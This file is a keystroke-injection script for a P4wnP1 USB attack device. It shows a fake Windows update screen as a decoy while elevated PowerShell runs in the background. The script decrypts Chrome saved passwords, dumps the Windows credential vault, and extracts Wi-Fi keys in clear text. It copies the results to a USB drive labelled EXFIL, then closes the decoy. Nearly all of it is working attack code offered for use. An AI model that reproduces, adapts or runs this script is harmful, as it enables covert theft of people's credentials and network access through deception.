//========================== Mon's Fake Windows Update ==============================

//SYNOPSIS
// This script will attempt to get saved browser passwords and wifi passwords


layout("us")
press("GUI r");
delay(500);
type("powershell -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(2000);
press("ALT y");
delay(2000);
type("Dism /online /Get-Intl");
press("ENTER")
delay(1000);
type("Set-WinSystemLocale en-US");
press("ENTER")
delay(500);
type("Set-WinUserLanguageList en-US -Force");
press("ENTER")
delay(500);

function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(2000);
}
assurePS32(); // open a 32bit console, if the current one is 64bit
delay(2000);

type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,1024,1024,16512)\n')
type('start msedge.exe -kiosk https://fakeupdate.net/win8/\n')
type('function Get-ChromeCreds() {Param([String]$Path	);if ([String]::IsNullOrEmpty($Path)) {$Path = "$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";}\n')
type('if (![system.io.file]::Exists($Path)){Write-host \'Chrome db file doesnt exist, or invalid file path specified.\';Break;}\n')
type('Add-Type -AssemblyName System.Security;$Stream = New-Object IO.FileStream -ArgumentList "$Path", \'Open\', \'Read\', \'ReadWrite\';$Encoding = [system.Text.Encoding]::GetEncoding(28591)\n')
type('$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding;$BinaryText = $StreamReader.ReadToEnd();$StreamReader.Close();$Stream.Close()\n')
type('$PwdRegex = [Regex] \'(\\x01\\x00\\x00\\x00\\xD0\\x8C\\x9D\\xDF\\x01\\x15\\xD1\\x11\\x8C\\x7A\\x00\\xC0\\x4F\\xC2\\x97\\xEB\\x01\\x00\\x00\\x00)[\\s\\S]*?(?=\\x68\\x74\\x74\\x70|\\Z)\'\n')
type('$PwdMatches = $PwdRegex.Matches($BinaryText);$PwdNum = 0;$DecPwdArray = @();$PwdMatchCount = $PwdMatches.Count\n')
type('Foreach ($Pwd in $PwdMatches) {$Pwd = $Encoding.GetBytes($PwdMatches[$PwdNum]);$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);$DecPwd = [System.Text.Encoding]::Default.GetString($Decrypt);$DecPwdArray += $DecPwd;$PwdNum += 1;}\n')
type('$UserRegex = [Regex] \'(?<=\\x0D\\x0D\\x0D[\\s\\S]{2}\\x68\\x74\\x74\\x70)[\\s\\S]*?(?=\\x01\\x00\\x00\\x00\\xD0\\x8C\\x9D\\xDF\\x01\\x15\\xD1\\x11\\x8C\\x7A\\x00\\xC0\\x4F\\xC2\\x97\\xEB\\x01\\x00\\x00\\x00)\'\n')
type('$UserMatches = $UserRegex.Matches($BinaryText);$UserNum = 0;$UserMatchCount = $UserMatches.Count;$UserArray = @()	\n')
type('if (-NOT ($UserMatchCount -eq $PwdMatchCount)) { Write-host ([string]"The number of users is different than the number of passwords! This is most likely due to a regex mismatch.")}	\n')
type('$HTTP = "http";Foreach ($User in $UserMatches) {$User = $Encoding.GetBytes($UserMatches[$UserNum]);$User = $HTTPEnc + $User;$UserString = [System.Text.Encoding]::Default.GetString($User);$UserString = $HTTP + $UserString;$UserArray += $UserString;$UserNum += 1;}	\n')
type('$ArrayFinal = New-Object -TypeName System.Collections.ArrayList;for ($i = 0; $i -lt $UserNum; $i++) {;$ObjectProp = @{ \n')
type('UserURL = $UserArray[$i];Password = $DecPwdArray[$i];};$obj = New-Object PSObject -Property $ObjectProp;$ArrayFinal.Add($obj) | Out-Null;};$ArrayFinal;}\n')
type('\n')
type('rm c:\\temp\\temp.txt\n')
type('rm c:\\temp\\temp2.txt\n')
type('rm c:\\temp\\temp3.txt\n')
type('Get-ChromeCreds > c:\\temp\\temp.txt\n')
type('$p4wnp1 = [System.IO.DriveInfo]::getdrives() |where-object {$_.VolumeLabel -match "EXFIL"}|sort {$_.name} |foreach-object {; echo "$(echo $_.name)";}\n')
type('$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$VaultObj = new-object Windows.Security.Credentials.PasswordVault;$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ } | select Username,Password,resource > c:\\temp\\temp2.txt\n')
type('$SSID=((netsh wlan show profiles key=clear));\n')
type('for ($n=0;$n -le $SSID.count-1;$n++){try {;$fin = $fin + $SSID[$n]+((netsh wlan show profiles $SSID[$n].Substring($SSID[$n].Length -($SSID[$n].Length -1)) key=clear) -match \'Key C[^:]+:.(.+)$\').split(":")[1];} catch {};};$fin > c:\\temp\\temp3.txt \n')
type('\n')
type('cp c:\\temp\\temp.txt ($p4wnp1+$env:computername+"chrome.txt")\n')
type('cp c:\\temp\\temp2.txt ($p4wnp1+$env:computername+"ie.txt")\n')
type('cp c:\\temp\\temp3.txt ($p4wnp1+$env:computername+"wifi.txt")\n')
type('$fpid = Get-Process | where {$_.mainWindowTitle -like "*fakeupdate*"} | Select-Object -Property Id\n')
type('kill $fpid.id\n')
type('\n')
type('exit\n')
type('\n')
type('\n')
type('\n')